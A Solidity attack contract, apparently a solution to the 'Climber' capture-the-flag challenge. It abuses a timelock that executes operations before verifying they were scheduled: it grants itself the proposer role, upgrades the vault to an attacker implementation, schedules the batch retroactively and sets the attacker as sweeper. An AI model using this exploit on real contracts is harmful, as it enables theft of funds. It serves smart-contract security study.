// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVaultAttack.sol";

contract ClimberTimelockAttack {
    bytes32 SALT = keccak256("SALT");
    address vault;
    address attacker;
    ClimberTimelock timelock;
    address token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address payable _timelock,
        address _vault,
        address _attacker,
        address _token
    ) {
        timelock = ClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
        token = _token;
    }

    function attack(address newImplementation) external {
        // grant the proposer role to this contract to be able to schedule tasks
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", newImplementation)
        );

        // schedule the above tasks through this contract
        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        timelock.execute(targets, values, dataElements, SALT);

        ClimberVaultAttack(vault).setSweeper(attacker);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
